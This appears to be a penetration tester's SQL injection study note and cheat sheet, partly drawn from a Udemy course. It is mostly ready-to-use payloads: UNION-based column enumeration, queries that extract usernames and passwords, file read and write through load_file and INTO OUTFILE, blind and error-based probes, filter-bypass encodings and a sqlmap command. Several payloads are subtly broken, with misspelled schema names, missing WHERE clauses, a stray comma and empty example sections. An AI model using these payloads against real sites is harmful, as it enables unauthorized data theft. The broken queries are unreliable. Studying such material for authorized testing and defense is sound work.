## Chapter 9 : SQL 


1) Check user input vulnerability points : URL, fields, User-agent, Language 


2) Test the user inputs with basic payloads to check if the vulnerability and type of injections : __Blind, Band, Error_Based__ SQL


3) Query the number of the columns in the databasee


4) Find out the datatype of the columns


5) Extract basic information as the version or database name 


&nbsp;
&nbsp;
&nbsp;


### Discovery


__Type 1:Straightforward___


1- Submit a single quotation mark as the item of data you are targeting.



__Basic Discovery Commands :__



Examples :


>> __' OR 1=1 ;--__ 
    
>> __') OR 1=1; --__ 
   
>> __' and 'a'='a__

>> __' and 'a'='b__

   
&nbsp;
&nbsp;
&nbsp;



2- It is important to keep in mind that not all vulnerabilities are straighforward.
   It is essential while testing to look for the behavior of the application:


 - __Error_based:__ the application shows the error to the end user 


- __Blind__ does not show any thing back to the user. It is mainly revolves on booleans
	 of True or False (application behavior)


- __Band__


__Note:__ It is always recommend to probe the applcation as Blind SQL injection, if the basic payloads did not work 


&nbsp;
&nbsp;

__Type 2:Bypass Filters__


1- Use the above commands in encoding manner in order to bypass filters 


__Basic Encodign Commands:__


Examples:


>>


>>



--------------------------------------------------------------------------------------------------------------------

### Probing the Database 


__The UNION Operator__


1- Easily extract arbitrary data from within
  the database

&nbsp;
2- UNION is supported by all major DBMS products.

&nbsp;
3- Your first task is to discover the number of columns returned by the original
  query being executed by the application. You can do this in two ways:

&nbsp;
4- You can exploit the fact that NULL can be converted to any data type to
  systematically inject queries with different numbers of columns until your
  injected query is executed
  

>>    ‘ UNION SELECT NULL--
>>       ‘ UNION SELECT NULL, NULL--
>>      ‘ UNION SELECT NULL, NULL, NULL--

&nbsp;
5- Having identified the required number of columns, your next task is to
  discover a column that has a string data type so that you can use this to
  extract arbitrary data from the database


 >>    ‘ UNION SELECT ‘a’, NULL, NULL--
 >>     ‘ UNION SELECT NULL, ‘a’, NULL--
 >>     ‘ UNION SELECT NULL, NULL, ‘a’--

&nbsp;
6- In Oracle databases, every SELECT statement must include a FROM
  attribute, so injecting UNION SELECT NULL produces an error regardless of
 the number of columns. You can satisfy this requirement by selecting from the
 globally accessible table DUAL. For example:


  >>  ‘ UNION SELECT NULL FROM DUAL--


&nbsp;
7- When you have identified the number of columns required in your injected
  query, and have found a column that has a string data type, you are in a position
  to extract arbitrary data.

  >>  EX: ‘ UNION SELECT @@version,NULL,NULL--
	
  >>   ‘ UNION SELECT banner,NULL,NULL FROM v$version-- | ORACLE



&nbsp;
&nbsp;
&nbsp;

-------------------------------------------------------------------------------------------------

### Exploitation : 


__Extracting Data with UNION__


__Type 1: Straightforward___


1- Find out the names of the database tables and columns that
  may contain interesting information


 >> EX: Name=Matthew’%20union%20select%20table_name,column_name,null,null,
      null%20from%20information_schema.columns--__

&nbsp;
2- Select the required column

 >> Ex: Name=Matthew’%20UNION%20select%20username,password,null,null,null%20  
   from%20users--__


&nbsp;
__Note:__

The information_schema is supported by MS-SQL, MySQL, and many
other databases, including SQLite and Postgresql. It is designed to hold database
metadata,EXCEPT ORACLE


__ORACLE: SELECT table_name,column_name FROM all_tab_
	columns to retrieve information about tables and columns in the database.__


&nbsp;

3- Search for interesting pieces of inforamtion:

 __EX: SELECT table_name,column_name FROM information_schema.columns where
      column_name LIKE ‘%PASS%’__

&nbsp;
&nbsp;


__Type 2 : Bypass Filters__


__Method 1:__  Sometimes when injecting the payload, it wont work as the url is encoded or common characters are removed 


 >> select ename,sal from emp where ename=’marcus’:

&nbsp;

__Encoding with ASCII__

>> Ex: SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)
&nbsp;

>>  SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)



__Method 2:__  if the query does not work, there might be a filter for words :


>> 	SeLeCt
>>	%00SELECT
>>	SELSELECTECT
>>	%53%45%4c%45%43%54
>>	%2553%2545%254c%2545%2543%2554__


__Method 3:__ Using SQL Comments

		
 >> EX: SELECT/*foo*/username,password/*foo*/FROM/*foo*/users

&nbsp;
>> SEL/*foo*/ECT username,password FR/*foo*/OM users



__Method 4:__ Dealing with single quotes issue:

		

- Sometimes single quote causes error in the database 

		
		
- To exploit this vulnerability, an attacker can simply register a username
  containing his crafted input, and then attempt to change his password. 


>> EX: ‘ or 1 in (select password from users where username=’admin’)--


&nbsp;
&nbsp;

## More Examples :


>> union select 1, 2, 3 %23                  &nbsp;&nbsp;  |  Bypass Web filters  | 


>> uNioN+sEleCt+1,2+%23                      &nbsp;&nbsp;  |  Bypass Web filters  |  


>> uNioN`/**/`sEleCt`/**/`1,2`/**/`%23       &nbsp;&nbsp;  |  Bypass Web filters  | 
>>

>> UniOn selEct 1,version() /*


>> UniOn selEct 1,database() /*


>> UniOn selEct 1,user() /*


>> UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[database name]' /*


>> UniOn selEct 1,column_name frOm information_schema.columns table_name = '[table name]' /*


>> UniOn selEct 1,[column name] frOm [table name] /*


>> UniOn selEct 1,load_file('file location') /*   Reading files:


>> UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*  Writing files 


>> union select 1, column_name, null, from Infromation_schema .columns where table_name = 0x769166  &nbsp;&nbsp; | hex encoding                                                                                                                                dbname   


>>  ' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts' | 


>>  ' union select username, pass, is_admin from 'accounts' &nbsp;&nbsp;  | 


>>  ' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb 


 &nbsp; 
 &nbsp; 
 &nbsp; 
--------------------------------------------------------------------------------------------------------------------------------


## SQL Testing :


- __Define__ all the user inputs and fields 

- __Confirm__ the web app backend runs SQL. One way of confi rming that the application is interacting with a backend
              database is to submit the SQL wildcard character % in a given parameter

- __Submit a single quotation__ mark as the item of data you are targeting.


- Observe whether an error occurs, or whether the result differs from the original in any other way.
  

- __submit two single quotation__ marks together for testing. Sometimes one single quote is not enough to show the error.


__Basic Payloads___


    >> ' OR 1=1 ;--
    
    >> ') OR 1=1; --
    
    
- __URL encodings__ are necessary whether you are editing the parameter’s  value directly from your browser, with an intercepting 
                    proxy, or through any other means.
    
    

&nbsp; 
 &nbsp; 
 &nbsp; 
   
### Blind SQL : 

This type of SQL injection is based on booleans : True or False .


- ' and 'a'='a

- ' and 'a'='b

- ' and substring(@@version,1,1)='5   &nbsp; |  &nbsp; find the version of the db


if you get a error means that SQL vulnerability is error based, if not means blind SQl.

For Blind SQL, we need to focus on the behavior of the application and try different queries :

>>> ' and 'a'='a    |  if data displayed mean that there is SQL vulnerability 


>>> ' UNION SELECT null;-- - |  this command is used to enumerate the database in order to know the number of columns it has


>>>  ' UNION SELECT "else1";-- - | test the query with string,or intger to see the type of data in the columns

>>>> 99999 ' UNION SELECT null;-- - |  to display our entered data on the fields


>>>  99999 UNION SELECT @@version;| @@version is to know the version of the db

>>>




Automate the process of SQL blind
>> script 

&nbsp; 
 &nbsp; 
 &nbsp; 
   
### Band SQL:

- ' and 'a'='a

- ' and 'a'='b

- 9999' UNION SELECT name,222,'else1' FROM master.syslogin; --

### Error based SQL:

- 1 or db_name()=1);

- 1 or db_name(0)=1) | increase the number until the database does not show any errors

- 

 
 &nbsp; 
 &nbsp; 
 &nbsp; 
   
### SQLmap:

- sqlmap  &nbsp; -u URL  &nbsp; -p search  &nbsp; --technique=U |  &nbsp; U for Union Selection



## [PentesMonkey CheatSheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

 &nbsp; 
 &nbsp; 
 &nbsp; 
------------------------------------------------------------------------------------------------------------------------------

## [Notes from Udemy Course]

>> http://www.site.com/news/php=7' order by 1 # |  &nbsp;  use order by 1 followed by # as a comment 

__URL Encoding__:  http://www.site.com/news/php=7' order by 1 %23

order by shows how many columns in the DB

 &nbsp; 
 &nbsp

>> ' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb'

__information_schema__ is a default schema in every database

__table_schema__ is the database name 

__table_name__ is the name of the table 


The above SQL command should return the name of the schemas in the database 

 &nbsp; 
 &nbsp;
 
>>>> ' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts'

>>> ' union select username, pass, is_admin from 'accounts'


&nbsp; 
&nbsp;

### Blind SQL:

Every type of injection has different discovery methods. for the Blind SQL, booleans are the key players in understanding 

whether the web app is vulnerable to the injections


>> 1' and 1=1 &nbsp; | nbsp; True 

>> 1' and 1=0 &nbsp; 
|  &nbsp; False 


>> 1' order by 1 &nbsp; 
|  &nbsp; True


>> 1' order by 10000 &nbsp; 
| &nbsp; False



__Note:__

- The exploitation part is similar to all other types of SQL injections 

- When pentesting a web application, always start with the Blind Injections as they are the complex ones, and can show

  the behavior of the application. The error based are very clear and straightforward, as they show the outputs on 

  the screen 



&nbsp;

__URL encoding of sql injection:__


- to pass certain filter sometimes it is important to convert the custom injection to URL encoding 


- Sometimes quotes or additional characters are not valid, removing them would inject the app


- Convert database names to hex in order to bypass the filter


>>  union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 0x769166


__Other ways to bypass the filters__

&nbsp;

- Spaces and some statements are filtered

>> union select 1, 2, 3 %23

>> uNioN+sEleCt+1,2+%23

>> uNioN/**/sEleCt/**/1,2/**/%23


---------------------------------------------------------------------------------------------------------------------------------








